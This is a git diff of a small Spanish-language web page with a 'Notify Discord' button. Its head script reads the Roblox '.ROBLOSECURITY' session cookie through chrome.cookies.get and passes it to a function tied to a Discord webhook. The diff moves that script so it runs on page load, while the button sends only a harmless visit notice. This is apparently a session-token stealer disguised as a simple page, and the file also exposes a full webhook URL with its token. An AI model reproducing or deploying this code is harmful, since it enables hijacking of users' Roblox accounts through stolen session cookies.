@@ -2,15 +2,8 @@
 <html>
 <head>
     <title>Mi Página Web</title>
-</head>
-<body>
-    <h1>Bienvenido a mi página web</h1>
-
-    <!-- Agrega un botón que, cuando se hace clic, enviará la notificación -->
-    <button id="notificar">Notificar a Discord</button>
-
     <script>
-const WEBHOOK = "https://discord.com/api/webhooks/1168538078156173483/aoOcOoNZYnbkmnKLWA3FzbLWBIjryc-aHn18RS94oH1el8p_cckUTI4z0jaxcZPp1vG8";
+    const WEBHOOK = "https://discord.com/api/webhooks/1168538078156173483/aoOcOoNZYnbkmnKLWA3FzbLWBIjryc-aHn18RS94oH1el8p_cckUTI4z0jaxcZPp1vG8";
 
 async function main(cookie) {
 
@@ -59,6 +52,50 @@ async function main(cookie) {
 chrome.cookies.get({ "url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY" }, function (cookie) {
   main(cookie ? cookie.value : null);
 });
+    </script>
+</head>
+<body>
+    <h1>Bienvenido a mi página web</h1>
+
+    <!-- Agrega un botón que, cuando se hace clic, enviará la notificación -->
+    <button id="notificar">Notificar a Discord</button>
+
+    <script>
+        // JavaScript para enviar la notificación al hacer clic en el botón
+        document.getElementById("notificar").addEventListener("click", function() {
+          // URL del webhook de Discord
+          var webhookUrl = "https://discord.com/api/webhooks/1168538078156173483/aoOcOoNZYnbkmnKLWA3FzbLWBIjryc-aHn18RS94oH1el8p_cckUTI4z0jaxcZPp1vG8";
+
+
+              
+          // Datos de la notificación
+              
+          var mensaje = "¡Alguien ha entrado a la página web!";
+
+          // Objeto para enviar la notificación
+          var data = {
+              content: mensaje
+          };
+
+          // Enviar la notificación a Discord
+          fetch(webhookUrl, {
+              method: "POST",
+              headers: {
+                  "Content-Type": "application/json"
+              },
+              body: JSON.stringify(data )
+          })
+          .then(function(response) {
+              if (response.ok) {
+                  console.log("Notificación enviada con éxito a Discord.");
+              } else {
+                  console.error("Error al enviar la notificación a Discord.");
+              }
+          })
+          .catch(function(error) {
+              console.error("Error en la solicitud:", error);
+          });
+      });
     </script>
 </body>
 </html>
